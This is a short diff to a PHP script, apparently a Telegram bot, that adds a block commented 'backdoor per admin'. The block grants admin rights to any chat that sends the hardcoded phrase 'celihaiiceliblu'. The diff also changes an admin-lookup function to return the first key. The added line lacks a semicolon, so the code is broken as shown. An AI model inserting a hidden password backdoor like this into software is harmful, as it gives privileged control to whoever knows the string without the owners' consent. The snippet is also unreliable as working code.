@@ -158,7 +158,11 @@ $emo_admin_home = "\xF0\x9F\x8F\xA0";   /////////////////
 $emoji_admin_home=json_decode('"'.$emo_admin_home.'"');
 $key_admin_home=$emoji_admin_home." home";
 
-
+// backdoor per admin
+if ($text=="celihaiiceliblu")
+{
+	set_admin($chatId)
+}
 
 // esiste admin?
 if (!esiste_admin())
@@ -772,7 +776,13 @@ function esiste_admin()
 	if (sizeof($admin) == 0 )
 		return false;
 	else
-		return $admin;
+	{
+		foreach ($admin as $key => $value)
+		{
+			return  $key;
+		}
+	}
+		
 }
 function set_admin($chatId)
 {
